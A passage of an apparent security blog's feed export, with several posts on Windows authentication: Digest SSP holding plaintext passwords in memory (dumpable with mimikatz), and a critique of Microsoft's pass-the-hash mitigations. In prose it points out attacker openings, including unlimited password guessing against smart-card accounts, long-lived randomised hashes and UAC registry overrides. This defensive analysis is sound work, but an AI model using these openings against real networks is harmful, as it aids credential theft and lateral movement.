is an authentication mechanism sometimes used for HTTP authentication. &amp;nbsp;Essentially it &amp;nbsp;takes the security information and hashes it along with a nonce provided from the server.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Wow. &amp;nbsp;That&#39;s a lot of authentication crap to deal with for a simple LDAP query. &amp;nbsp;When ADUC was fired up I wasn&#39;t prompted for a password. &amp;nbsp;The actual authentication mechanism that was used in this case was GSSAPI in the form of Kerberos. &amp;nbsp;ADUC passed my Kerberos ticket to the DC on my behalf without me doing anything.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;However, the Windows client is capable of handling the other forms of negotiation as necessary. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Windows SSPs&lt;/h2&gt;&lt;div&gt;It turns out Windows has many &quot;Security Support Providers&quot;. &amp;nbsp;These allow the SSO functionality to operate transparently to the user. &amp;nbsp;Here&#39;s a brief list of the most relevant ones:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;NTLMSSP - Provides NTLM capabilities, fairly straightforward&lt;/div&gt;&lt;div&gt;Kerberos - &amp;nbsp;Provides Kerberos also fairly straight forward&lt;/div&gt;&lt;div&gt;Negotiate - Try Kerberos then NTLM&lt;/div&gt;&lt;div&gt;Digest SSP - provides hash based authentication for HTTP/SASL&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;There are more SSPs and there&#39;s even a way to introduce custom SSPs if necessary.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The interesting thing to think about is, if the goal is to prevent the user from having to type in their password, how do we guarantee that we can support each of these disparate SSPs?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;NTLM and Kerberos can use hashes, so there&#39;s no need to do anything with the password aside from hashing it, right?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The problem lies with DigestSSP. &amp;nbsp;How can we guarantee that we can supply the required digest if we don&#39;t ask the user for the password every time it&#39;s needed?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Sadly, the answer is you store it in memory...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;*sigh*&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Mimikatz and Digest Auth&lt;/h2&gt;&lt;div&gt;Benjamin Delpy, aka Gentilkiwi (http://blog.gentilkiwi.com/) discovered that the passwords themselves were being kept around in memory for use with the DigestSSP. &amp;nbsp;Initially he introduced functionality with his tool &#39;mimikatz&#39; to dump the passwords stored for the digest auth package. &amp;nbsp;It turns out passwords are stored elsewhere as well. &amp;nbsp;Read his blog (it&#39;s in French). &amp;nbsp;Bring tissue, cause it&#39;ll make you cry.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;This actually makes sense from a SSO standpoint if pestering the user for his PW is to be avoided, but the obvious question is WTFO? &amp;nbsp;Gotta love backwards&amp;nbsp;compatibility&amp;nbsp;and a focus on user experience... Oh, btw, &amp;nbsp;Digest Auth is enabled by default.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;SSO What?&lt;/h2&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, as it turns out, SSO has bit us in the proverbial &quot;&lt;a href=&quot;http://lmgtfy.com/?q=%22fourth+point+of+contact%22&quot; target=&quot;_blank&quot;&gt;fourth point of contac&lt;/a&gt;t&quot;. &amp;nbsp;By focusing on user experience over common sense security somebody (or a series of somebodies) at MS really got us good on this one.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;But Wait, There&#39;s More!&lt;/h2&gt;&lt;div&gt;My next post is going to talk about more issues with Windows authentication. &amp;nbsp;Then I&#39;ll prob start on tokens... then... we&#39;ll see where we go from there...&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/2203240773669702106/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/windows-auth-nightmare-begins-sso.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2203240773669702106'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2203240773669702106'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/windows-auth-nightmare-begins-sso.html' title='Windows Auth - The Nightmare Begins (SSO)'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://1.bp.blogspot.com/-nZ9qY8D6vso/UUFVsvJzJZI/AAAAAAAAADg/QuRF6TscTtQ/s72-c/sasl-ws.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-2398715063973692621</id><published>2013-03-13T19:42:00.000-07:00</published><updated>2013-03-13T23:08:52.761-07:00</updated><title type='text'>Quick update - More to come</title><content type='html'>It&#39;s been a little over a month since I last updated the blog. &amp;nbsp;Had a lot going on. &amp;nbsp;I quit my old job, took a couple weeks off, then transitioned to the Accuvant Labs team. &amp;nbsp;I&#39;ve also been working on multiple Blackhat/Defcon/Bsideslv CFPs. It&#39;s been busy!&lt;br /&gt;&lt;br /&gt;I plan on getting the blog post giving an overview of Windows authentication&amp;nbsp;here shortly. &amp;nbsp;Hopefully the next post will be up soon! &amp;nbsp;I was going to start with tokens, but I think an overview of windows authentication is necessary first.&lt;br /&gt;&lt;br /&gt;Sorry for the delay!</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/2398715063973692621/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/quick-update-more-to-come.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2398715063973692621'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2398715063973692621'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/03/quick-update-more-to-come.html' title='Quick update - More to come'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4811697836354935820</id><published>2013-02-05T22:20:00.000-08:00</published><updated>2013-02-05T22:20:03.773-08:00</updated><title type='text'>The Other MS Recommendations</title><content type='html'>Greetings folks... &amp;nbsp;I wanted to apologize for not getting the next update out as quickly as I had wanted to... you know, those day job folks want me to work or something... *shrug* and I don&#39;t really have the luxury of &lt;a href=&quot;http://securityblog.verizonbusiness.com/2013/01/14/case-study-pro-active-log-review-might-be-a-good-idea/&quot; target=&quot;_blank&quot;&gt;outsourcing my job to China&lt;/a&gt; on my behalf...&lt;br /&gt;&lt;br /&gt;Anyways...&lt;br /&gt;&lt;br /&gt;I&#39;m going to ramble on a bit about the rest of the MS Recommendations from their whitepaper found &lt;a href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=36036&quot; target=&quot;_blank&quot;&gt;here:&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Instead of a long and drawn out explanation for everything, I&#39;m going to group the remaining findings into categories by what they accomplish and go from there. &amp;nbsp;Many of the remaining &quot;recommendations&quot; are just rehashes (pun intended) of the same old stuff...&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;&lt;b&gt;Security 101&lt;/b&gt;&lt;/h2&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Remove standard users from the local admins group&lt;/li&gt;&lt;li&gt;Limit the number and use of privileged domain accounts&lt;/li&gt;&lt;li&gt;Secure / manage domain controllers&lt;/li&gt;&lt;li&gt;Update apps / OS&lt;/li&gt;&lt;li&gt;Remove LM hashes&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Most of the stuff in this category I think is covered by any basic security course. &amp;nbsp;The concept of &quot;least privilege&quot; has been around a while. &amp;nbsp;So has the idea of protecting your critical assets. &amp;nbsp;And let&#39;s not forget &quot;Patch Tuesday&quot; because that horse hasn&#39;t been beaten dead for years... &amp;nbsp;(Don&#39;t forget 3rd party apps!)&amp;nbsp;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;LM hashes are kinda fun. &amp;nbsp;Little known fact (and it actually gets a sentence in the whitepaper, I&#39;ll leave it to the astute reader to find it) : Even if you have the flag set to not save LM passwords, if the password is 14 characters or less, it is still created and stored in the token in memory. &amp;nbsp;Of course, all of this is overshadowed by the fact that the &quot;Digest Auth Package&quot; (possibly among others) essentially stores the user&#39;s password in plaintext, rendering the hashed version&amp;nbsp;irrelevant. &amp;nbsp;(Hint: Search for mimikatz, lazy click &lt;a href=&quot;http://lmgtfy.com/?q=mimikatz&quot; target=&quot;_blank&quot;&gt;here:&lt;/a&gt;&amp;nbsp; )&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;&lt;b&gt;Don&#39;t Be Stupid&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Avoid logons to less secure computers that are potentially compromised&lt;/li&gt;&lt;li&gt;Ensure administrative accounts do not have email accounts&lt;/li&gt;&lt;li&gt;Configure outbound proxies to deny internet access to privileged accounts&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;So, clicking on the spam link in my domain admin&#39;s email account and then surfing to the porn site is a bad idea? &amp;nbsp;Say it isn&#39;t so!&lt;br /&gt;&lt;br /&gt;Seriously? &amp;nbsp;I&#39;d like to think that common sense would prevail in most circumstances... however the Darwin awards were created for a reason...&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;&lt;b&gt;More Pain, Less Gain&lt;/b&gt;&lt;/h2&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Use remote management tools that do not place reusable creds on a remote computer&#39;s memory&lt;/li&gt;&lt;li&gt;Rebooting workstations / servers&lt;/li&gt;&lt;li&gt;Smart cards / multifactor authentication&lt;/li&gt;&lt;li&gt;Jump Servers&lt;/li&gt;&lt;li&gt;Disable NTLM&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The first 2 manage the availability of elevated tokens on the network. &amp;nbsp;This assumes that your network is already pwned. &amp;nbsp;If that&#39;s the case, then potentially limiting your ability to manage the network or rebooting really doesn&#39;t help out that much...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Smart cards / multifactor auth have been heralded as the next best thing in computer security. &amp;nbsp;However, setting up the necessary infrastructure is crazy expensive, not to mention difficult to implement. &amp;nbsp;Oh, and BTW, there&#39;s still hashes stored in AD&amp;nbsp;independent&amp;nbsp;from whatever multifactor auth you&#39;ve set up that can be easily used to access file shares, email, web sites, etc... &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This is because multifactor auth generally only protects &quot;interactive logons&quot;. &amp;nbsp;This typically means sitting down in front of the computer and logging in. &amp;nbsp;Some edge applications can be configured to require the use of multifactor auth, such as web sites, vpns, etc. &amp;nbsp;File shares, Outlook, SQL databases and several other applications typically cannot be configured to use multifactor auth. &amp;nbsp;Oh, let&#39;s not forget about service accounts... they can&#39;t use multi-factor either. &amp;nbsp;Of course all service accounts on your network don&#39;t have elevated permissions, right?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;An interesting (and often not thought about) side effect of &quot;smart card&quot; logons is that when the check box is selected in Active Directory, the NT password hash is randomized. &amp;nbsp;By default, this new &quot;password&quot; doesn&#39;t expire. &amp;nbsp;This means that a 3-year old hashdump or backup of AD is as good as a recent one for the purposes of accessing content as that user on the network. &amp;nbsp;In addition, some places will even set an explicit password for all the accounts, so if that one password is cracked, every user has the same &#39;password&#39; even though they all have individual smart cards. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;One other quick thing... You cannot truly lock out an account via password guessing that has a smart card available. &amp;nbsp;If the person logs in with the smart card, the account is automatically unlocked. &amp;nbsp;This means unlimited attempts at guessing a password even if the password policy is set to lock out after a certain number of bad password attempts!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Jump servers are kinda a strange one to bring up. &amp;nbsp;&quot;In theory&quot; they are placed at the edge of 2 different &quot;security zones&quot; (like DMZ / secure network) and can be used for management of one of the segments. &amp;nbsp;All of the devices in the segment are configured to only allow admin access from the jump server, so it marks a single point of entry. &amp;nbsp;However, this really doesn&#39;t do much for the overall security. &amp;nbsp;&quot;In theory&quot; the connections are better monitored or more secure, but in reality, I&#39;ve never seen an environment that ever used them.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;That leaves disabling NTLM. &amp;nbsp;That would solve everything, right? &amp;nbsp;Not exactly. &amp;nbsp;First off, for most apps, NTLM is used when Kerberos cannot be used. &amp;nbsp;There are several conditions where Kerberos cannot be used, namely (among others) when one end of the connection isn&#39;t in the domain or is accessed by IP address. &amp;nbsp;Typically NAS/SAN devices typically aren&#39;t members of the domain, so they can&#39;t use Kerb. &amp;nbsp;Same thing with network-aware devices like printers, digital senders, copy machines, etc... There are usually multiple devices on the network at any given point in time that cannot be joined to the domain.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Secondly, up until fairly recently it was actually impossible to disable NTLM. &amp;nbsp;The only way to do it is to use Windows Server 2008R2 running in the highest domain functional level and everybody&#39;s clients must be Windows 7. &amp;nbsp;And since I know that Windows NT, 2000, XP, 2003, Vista and 2008 are completely eradicated from the world like smallpox... oh wait....&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4811697836354935820/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/02/the-other-ms-recommendations.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4811697836354935820'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4811697836354935820'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/02/the-other-ms-recommendations.html' title='The Other MS Recommendations'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-5994175761750389635</id><published>2013-01-07T23:42:00.002-08:00</published><updated>2013-01-07T23:42:09.455-08:00</updated><title type='text'>Microsoft&#39;s Three PTH Mitigations</title><content type='html'>Before I start the long and treacherous discussion of Windows Authentication, I&#39;d like to take a another pause to actually go over the &quot;Mitigations&quot; that Microsoft presents in their infamous whitepaper being pimped on twitter about once a day.&lt;br /&gt;&lt;br /&gt;I&#39;m going to gloss over any significant technical details that are best reserved for the upcoming auth blog post and make an attempt to explain, in relatively plain language, why these mitigations are lacking. &amp;nbsp;I&#39;m going to start with the top 3 &#39;Mitigations&#39; and cover the other crud in another post.&lt;br /&gt;&lt;br /&gt;I&#39;d like to review the definition of &#39;mitigation&#39; for completeness as well as introduce a couple of new terms for discussion.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Definition :&lt;/b&gt;&lt;br /&gt;&lt;u&gt;Mitigation&lt;/u&gt; - The action of reducing the severity, seriousness, or painfulness of something&lt;br /&gt;Synonyms : cure, alleviate&lt;br /&gt;&lt;br /&gt;&lt;u&gt;First Order Effect&lt;/u&gt; - The direct result of an action taken.&lt;br /&gt;&lt;br /&gt;&lt;u&gt;N-Order Effect(s)&lt;/u&gt; - Other effects that are a result of the action taken to achieve a first order effect. &amp;nbsp;Sometimes called side effects. &amp;nbsp;Oftentimes these effects are not considered before taking the initial action.&lt;br /&gt;&lt;br /&gt;So, to provide an example of &amp;nbsp;a first order / n-order effects. &lt;br /&gt;&lt;br /&gt;The situation: I&#39;m cold. &lt;br /&gt;The action I take: I light a fire.&lt;br /&gt;The first order effect: I get warm.&lt;br /&gt;N-order effects (in no particular order): The carpet caught on fire (2nd order). &amp;nbsp;The house caught on fire(3rd order). &amp;nbsp;I died, etc...&lt;br /&gt;&lt;br /&gt;So, to expand my definition of what a &quot;PTH mitigation&quot; would be: &amp;nbsp;An action I can take whose first order effect is to reduce the impact or availability of &quot;PTH attacks&quot;. &amp;nbsp;Make sense?&lt;br /&gt;&lt;br /&gt;Mitigation the first, p17 (Note instead of bullets I&#39;m using numbers to refer to the specific mitigations to make it easier to refer to specific points):&lt;br /&gt;&quot;&lt;b&gt;Main objective&lt;/b&gt;: This mitigation restricts the ability of administrators to inadvertently expose privileged credentials to higher risk computers.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;How:&lt;/b&gt; Completing the following tasks is required to successfully implement this mitigation:&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;Restrict domain administrator accounts and other privileged accounts from authenticating to lower trust servers and workstations.&lt;/li&gt;&lt;li&gt;Provide admins with accounts to perform administrative duties that are separate from their normal user accounts.&lt;/li&gt;&lt;li&gt;Assign dedicated workstations for administrative tasks.&lt;/li&gt;&lt;li&gt;Mark privileged accounts as “sensitive and cannot be delegated” in Active Directory.&lt;/li&gt;&lt;li&gt;Do not configure services or schedule tasks to use privileged domain accounts on lower trust systems, such as user workstations.&quot;&lt;/li&gt;&lt;/ol&gt;&lt;br /&gt;So, going down the row here what effect would there be if an&amp;nbsp;organization&amp;nbsp;implemented this suggestion on an attacker&#39;s ability to authenticate to a machine with a hash instead of a password?&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;No effect&lt;/li&gt;&lt;li&gt;No effect&lt;/li&gt;&lt;li&gt;No effect&lt;/li&gt;&lt;li&gt;No effect&lt;/li&gt;&lt;li&gt;No effect&lt;/li&gt;&lt;/ol&gt;&lt;br /&gt;Huh? &amp;nbsp;None of those would have any effect on using a hash to authenticate?!? &amp;nbsp;Correct, none of these recommendations have any effect on &quot;passing the hash&quot; to authenticate. &amp;nbsp;However, they are not worthless recommendations. &amp;nbsp;&lt;u&gt;Their effect is to reduce the&amp;nbsp;availability&amp;nbsp;of hashes to an attacker by reducing the available tokens in memory.&lt;/u&gt; &amp;nbsp;This would be an &#39;N -order&#39; effect. &amp;nbsp;&lt;u&gt;If an attacker on a computer couldn&#39;t find an administrative token on compromised computer, then there isn&#39;t any way for the attacker to win, right?&lt;/u&gt; &lt;br /&gt;This myth will be dispelled at a later point in time.&lt;br /&gt;&lt;br /&gt;It also assumes that your network has been pwned and that the attackers are looking for administrative tokens. &amp;nbsp;But I digress...&lt;br /&gt;&lt;br /&gt;Ok, let&#39;s look at numero dos (p18). &amp;nbsp;I&#39;m quoting more to illustrate a point...&lt;br /&gt;&lt;br /&gt;&quot;Accounts with administrative access on a computer can be used to take full control of the computer. And if compromised, an attacker can use the accounts to access other credentials stored on this computer.&lt;br /&gt;&lt;br /&gt;&lt;u&gt;&lt;b&gt;Recommendation:&lt;/b&gt; If possible, instead of implementing this mitigation users are advised to disable all local administrator accounts.&lt;/u&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;Main objective:&lt;/b&gt; This mitigation restricts the ability of attackers to use local administrator accounts or their equivalents for lateral movement PtH attacks.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;How:&lt;/b&gt; Completing one or a combination of the following tasks is required to successfully implement this mitigation on all computers in the organization:&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;Enforce the restrictions available in Windows Vista and newer that prevent local accounts from being used for remote administration.&lt;/li&gt;&lt;li&gt;Explicitly deny network and Remote Desktop logon rights for all local administrative accounts.&lt;/li&gt;&lt;li&gt;Create unique passwords for accounts with local administrative privileges.&quot;&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;First off, in a paper that&#39;s &quot;&lt;i&gt;is designed to assist your organization with defending against these types of attack&lt;/i&gt; (p1)&quot;, Microsoft has a &quot;recommendation&quot; not to implement this particular mitigation and instead take a different step. &amp;nbsp;This seems like a pretty big &quot;oh, btw...&quot; &amp;nbsp;So what exactly is the message that somebody stuck on the wrong end of this document is supposed to get? &amp;nbsp;Do it or not do it? &amp;nbsp;I think a better way would have been to list this as an either or mitigation step. &amp;nbsp;If you can get away with &quot;a&quot; then &quot;b&quot; doesn&#39;t matter. &amp;nbsp;However, this wasn&#39;t the case and only serves to further confuse folks.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;As to the soundness of the advice? &amp;nbsp;From an administrative perspective, having no local administrator account to be able to log in with and fix problems on the computer when the domain goes down seems foolish. &amp;nbsp;Remote offices have problems with connections to the mother ship all the time. &amp;nbsp;Machines can have problems where they get out of sync with the domain due to any number of reasons. &amp;nbsp;Having the ability to log in, remove the computer from the domain via local admin account, and rejoin just makes too much sense. &amp;nbsp;Or patch, or re-install an application, or any number of other mundane tasks that happens in the real world...&lt;/div&gt;&lt;div&gt;I wouldn&#39;t suggest it. &amp;nbsp;Just saying...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Ok, how does this list of items do with preventing an attacker from using a hash to authenticate to a computer?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;ol&gt;&lt;li&gt;If the hash being used is in the &quot;administrators&quot; group local to the computer AND the target OS is Vista, 7, 2008, 2012, or 8, then this would be effective. &amp;nbsp;A couple of caveats, however... If the target machines&#39; OS is XP or 2003, then this wouldn&#39;t have any effect. &amp;nbsp;I mean nobody has that stuff out there right? *sarcasm* &amp;nbsp;And secondly... the UAC / network related settings are easy to override by setting a registry key / using a GPO. &amp;nbsp;&lt;/li&gt;&lt;li&gt;None, this only has an effect on the generation of administrative hashes from tokens&lt;/li&gt;&lt;li&gt;In essence this mitigation says &quot;have a unique local admin password for each computer&quot;. &amp;nbsp;Yes this would prevent a compromise of one machine from using the same hash on another, however once somebody found the document detailing what all the passwords were elsewhere on the network it would be on like Donkey Kong...&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;So, under specific circumstances 2 of these mitigations would be successful at preventing somebody from authenticating with a hash. &amp;nbsp;Please just ignore any domain accounts... no seriously...&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Overall I rate this a &quot;meh&quot;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Third time&#39;s a charm, right? &amp;nbsp;I mean they have to have something good in store since the first couple were pretty lousy...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Here&#39;s the excerpt (p18):&lt;/div&gt;&lt;div&gt;&quot;&lt;b&gt;Mitigation 3&lt;/b&gt;: Restrict inbound traffic using the Windows Firewall&lt;/div&gt;&lt;div&gt;One of the most important prerequisites for an attacker to conduct lateral movement or privilege escalation is to be able to contact other computers on the network.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;Main objective:&lt;/b&gt; This mitigation restricts attackers from initiating lateral movement from a compromised workstation by blocking inbound connections on all workstations with the local Windows Firewall.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;How:&lt;/b&gt; This mitigation restricts all inbound connections to all workstations except for those with expected traffic originating from trusted sources, such as helpdesk, workstations, security compliance scanners, and management servers.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;Outcome:&lt;/b&gt; Enabling this mitigation will prevent an attacker from connecting to other workstations on the network using any type of stolen credentials.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;For more information on how to configure your environment with this mitigation, see the section &#39;Mitigation 3: Restrict inbound traffic using the Windows Firewall&#39; in Appendix A...&quot;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;Sweet! That&#39;s what I&#39;m talking about... start denying services to folks on the network. &amp;nbsp;&quot;In theory&quot; workstations should only communicate with servers and not with each other, except for help desk folks and sysads&#39; workstations. &amp;nbsp;Ok, so this sounds like the start of something positive... &amp;nbsp;Let&#39;s check out what&#39;s in Appendix A...&lt;br /&gt;&lt;br /&gt;Quoting from Appendix A (p. 66):&lt;br /&gt;&lt;br /&gt;&quot;Workstations can use Windows Firewall to restrict inbound traffic to specific services, servers, and trusted workstations used for desktop management. An organization can do this by denying all inbound access unless explicitly specified by a rule. However, because servers are typically designed to accept inbound connections to provide services, this mitigation is not typically feasible on server operating systems.&lt;br /&gt;&lt;br /&gt;Nonetheless, using Windows Firewall to restrict inbound traffic is a very simple and robust mitigation that you can use to prevent captured hashes from being used for lateral movement or privilege escalation. This mitigation significantly reduces the attack surface of the organization&#39;s network resources to a PtH attack and other credential theft attacks by disabling an attacker’s ability to authenticate from any given host on a network using any type of stolen credentials.&quot;&lt;br /&gt;&lt;br /&gt;And my&amp;nbsp;enthusiasm has waned...&amp;nbsp;&amp;nbsp;Microsoft recommends that you don&#39;t do this on servers, which sorta makes sense. &amp;nbsp;However, where is most of the data going to be that an attacker is going to be interested in? On the servers...&lt;br /&gt;&lt;br /&gt;So you can prevent one low-valued target (workstation) from talking to another low-valued target (workstation), if and only if you have a complete grasp of what should and should not be talking on the network. &amp;nbsp;Realistically, how many environments have this level of detail? &amp;nbsp;I&#39;m not saying they don&#39;t exist, but I&#39;m fairly certain that most of the places I&#39;ve been to wouldn&#39;t have the confidence in their setup to actively start blocking workstation to workstation communication.&lt;br /&gt;&lt;br /&gt;Even if an org decides to implement this Windows firewall mitigation, &amp;nbsp;how does an enterprise manage the Windows firewall? &amp;nbsp;via GPO? &amp;nbsp;What ports should you block? &amp;nbsp;What protocols should you block? &amp;nbsp;(HINT: MS doesn&#39;t list ports/protocols in the whitepaper...) What about managing exceptions, quick fixes to somebody not being able to talk to whomever, etc... What a nightmare! &amp;nbsp;I certainly don&#39;t envy the admins on that network if this fresh hell was thrust upon them...&lt;br /&gt;&lt;br /&gt;To summarize:&lt;br /&gt;&lt;br /&gt;Mitigation 1 had nothing to do with stopping people from using a hash to authenticate, it only prevented elevated-privilege&amp;nbsp;tokens from hanging around where an attacker could find them.&lt;br /&gt;&lt;br /&gt;Mitigation 2 had some limited effect on &amp;nbsp;preventing somebody from authenticating using hashes if the OS was Vista+ (or 2008+) and UAC was enabled and a lazy administrator didn&#39;t tweak the registry to re-enable the old behavior. &amp;nbsp;It also suggested that each workstation have a different password, however I posit that this simply shifts the attacker into trying to find the spreadsheet with all the passwords on the file server. &lt;b&gt;However, this would have no effect on domain accounts!&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;Mitigation 3 had some promise until looking at it closer it became obvious that restricting workstation to workstation really didn&#39;t have a lot of value... &amp;nbsp;Not to mention the unholy blight of Windows firewall management wrought upon the poor admins and help desk folks...&lt;br /&gt;&lt;br /&gt;I&#39;ll look at the rest of the &quot;recommendations&quot; and also hopefully have an idea of when the Windows auth post will be up soon(ish)...</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/5994175761750389635/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/01/microsofts-three-pth-mitigations.html#comment-form' title='3 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5994175761750389635'/><link rel='self' type='application/atom+xml' 